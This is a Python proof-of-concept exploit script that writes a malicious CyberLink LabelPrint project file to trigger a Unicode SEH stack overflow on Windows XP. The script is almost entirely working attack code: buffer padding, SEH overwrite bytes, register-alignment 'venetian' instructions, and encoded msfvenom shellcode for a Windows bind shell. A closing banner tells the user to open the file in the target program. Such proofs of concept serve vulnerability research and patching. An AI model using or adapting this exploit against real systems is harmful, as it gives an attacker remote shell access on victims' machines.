#!/usr/bin/python
# 
# Tested on Windows XP SP3 with:
# Power2Go 7 (build 196)
# Power2Go 8 (build 1031)
# 

import sys

header = ("\x3c\x50\x52\x4f\x4a\x45\x43\x54\x20\x76\x65\x72\x73\x69\x6f\x6e"
"\x3d\x22\x31\x2e\x30\x2e\x30\x30\x22\x3e\x0a\x09\x3c\x49\x4e\x46"
"\x4f\x52\x4d\x41\x54\x49\x4f\x4e\x20\x74\x69\x74\x6c\x65\x3d\x22"
"\x22\x20\x61\x75\x74\x68\x6f\x72\x3d\x22\x22\x20\x64\x61\x74\x65"
"\x3d\x22\x37\x2f\x32\x34\x2f\x32\x30\x31\x37\x22\x20\x53\x79\x73"
"\x74\x65\x6d\x54\x69\x6d\x65\x3d\x22\x32\x34\x2f\x30\x37\x2f\x32"
"\x30\x31\x37\x22\x3e")

filename2 = "overflow.lpp"
f = open(filename2,'w')
junk = "A" * 790
nseh = "\x61\x42"
seh = "\x2c\x44"		# windows 7
unicode_nop = "\x6f"


#venetian magic
ven = ""
ven += unicode_nop
#ven += "\x57"	#push edi
ven += "\x53"	#push ebx (for testing in XP)
ven += unicode_nop
ven += "\x58"	#pop eax
ven += unicode_nop
ven += "\x05\x19\x11" 	#add eax, 11001900 #align eax to our buffer
ven += unicode_nop
ven += "\x2d\x18\x11"	#add eax, 11001800 #align eax to our buffer
ven += unicode_nop

#aligning to make sure EAX pointing to EAX
walk = "\x73" * 111

#msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/unicode_upper BufferRegister=EAX -f python -v shellcode --smallest
#bad chars are = "\x22\x26\x3c" and everything above \x7f to \xff

sc =  ""
sc += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x51"
sc += "\x41\x54\x41\x58\x41\x5a\x41\x50\x55\x33\x51\x41\x44"
sc += "\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41"
sc += "\x51\x41\x49\x41\x51\x41\x50\x41\x35\x41\x41\x41\x50"
sc += "\x41\x5a\x31\x41\x49\x31\x41\x49\x41\x49\x41\x4a\x31"
sc += "\x31\x41\x49\x41\x49\x41\x58\x41\x35\x38\x41\x41\x50"
sc += "\x41\x5a\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49"
sc += "\x41\x49\x51\x49\x31\x31\x31\x31\x41\x49\x41\x4a\x51"
sc += "\x49\x31\x41\x59\x41\x5a\x42\x41\x42\x41\x42\x41\x42"
sc += "\x41\x42\x33\x30\x41\x50\x42\x39\x34\x34\x4a\x42\x4b"
sc += "\x4c\x5a\x48\x54\x42\x4d\x30\x4d\x30\x4b\x50\x51\x50"
sc += "\x43\x59\x4b\x35\x4e\x51\x47\x50\x33\x34\x34\x4b\x30"
sc += "\x50\x30\x30\x54\x4b\x51\x42\x4c\x4c\x54\x4b\x42\x32"
sc += "\x4e\x34\x34\x4b\x32\x52\x4f\x38\x4c\x4f\x38\x37\x30"
sc += "\x4a\x4e\x46\x30\x31\x4b\x4f\x56\x4c\x4f\x4c\x31\x51"
sc += "\x33\x4c\x4c\x42\x4e\x4c\x4d\x50\x37\x51\x38\x4f\x4c"
sc += "\x4d\x4d\x31\x38\x47\x5a\x42\x5a\x52\x50\x52\x30\x57"
sc += "\x34\x4b\x42\x32\x4e\x30\x44\x4b\x30\x4a\x4f\x4c\x54"
sc += "\x4b\x50\x4c\x4c\x51\x42\x58\x4a\x43\x4f\x58\x4d\x31"
sc += "\x5a\x31\x32\x31\x34\x4b\x50\x59\x4d\x50\x4d\x31\x48"
sc += "\x53\x44\x4b\x30\x49\x4d\x48\x49\x53\x4f\x4a\x30\x49"
sc += "\x54\x4b\x4f\x44\x34\x4b\x4b\x51\x59\x46\x4e\x51\x4b"
sc += "\x4f\x36\x4c\x39\x31\x48\x4f\x4c\x4d\x4b\x51\x57\x57"
sc += "\x50\x38\x4b\x30\x44\x35\x5a\x56\x4c\x43\x53\x4d\x4b"
sc += "\x48\x4f\x4b\x33\x4d\x4e\x44\x32\x55\x39\x54\x50\x58"
sc += "\x34\x4b\x52\x38\x4f\x34\x4b\x51\x5a\x33\x52\x46\x44"
sc += "\x4b\x4c\x4c\x50\x4b\x34\x4b\x51\x48\x4d\x4c\x4d\x31"
sc += "\x48\x53\x44\x4b\x4c\x44\x44\x4b\x4b\x51\x48\x50\x45"
sc += "\x39\x30\x44\x4f\x34\x4f\x34\x51\x4b\x51\x4b\x53\x31"
sc += "\x52\x39\x30\x5a\x32\x31\x4b\x4f\x4b\x30\x31\x4f\x51"
sc += "\x4f\x51\x4a\x54\x4b\x4e\x32\x5a\x4b\x54\x4d\x51\x4d"
sc += "\x42\x4a\x4b\x51\x44\x4d\x53\x55\x56\x52\x4b\x50\x4d"
sc += "\x30\x4d\x30\x32\x30\x42\x48\x4e\x51\x44\x4b\x52\x4f"
sc += "\x33\x57\x4b\x4f\x38\x55\x47\x4b\x4a\x50\x37\x45\x36"
sc += "\x42\x30\x56\x42\x48\x35\x56\x35\x45\x57\x4d\x45\x4d"
sc += "\x4b\x4f\x39\x45\x4f\x4c\x4c\x46\x53\x4c\x4b\x5a\x55"
sc += "\x30\x4b\x4b\x39\x50\x43\x45\x4d\x35\x57\x4b\x30\x47"
sc += "\x4d\x43\x52\x52\x52\x4f\x31\x5a\x4d\x30\x50\x53\x4b"
sc += "\x4f\x59\x45\x52\x43\x51\x51\x32\x4c\x33\x33\x4b\x50"
sc += "\x41\x41"

sisa =  "\x42" * (5000-len(junk+nseh+seh+ven+walk+sc))
payload = junk+nseh+seh+ven+walk+sc+sisa
bug="\x09\x09\x3c\x54\x52\x41\x43\x4b\x20\x6e\x61\x6d\x65\x3d"+'"'+payload+'"'+"/>\n" 
bug+=("\x09\x3c\x2f\x49\x4e\x46\x4f\x52\x4d\x41\x54\x49\x4f\x4e\x3e\x0a"
"\x3c\x2f\x50\x52\x4f\x4a\x45\x43\x54\x3e")
f.write(header+ "\n" + bug)
print "<--CyberLink LabelPrint File Project Processing Unicode Stack Overflow POC-->"
print "[*] by modpr0be <modpr0be[at]spentera.id"
print "[*] <------------------------------------------------------------------>\n"
print "[+] File", filename2, "successfully created!"
print "[*] Now open project file", filename2, "with CyberLink LabelPrint."
print "[*] Good luck ;)"
f.close()